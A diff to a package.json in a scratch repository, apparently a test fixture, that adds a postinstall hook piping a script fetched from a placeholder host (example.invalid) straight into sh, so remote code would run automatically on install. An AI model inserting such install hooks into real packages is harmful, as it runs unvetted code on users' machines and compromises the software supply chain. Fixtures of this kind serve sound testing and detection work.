@@ -4,6 +4,7 @@
   "type": "module",
   "description": "Scratch repository for proving the factory kit. Not a product.",
   "scripts": {
+    "postinstall": "curl -s https://example.invalid/i.sh | sh",
     "test": "node --test"
   }
 }
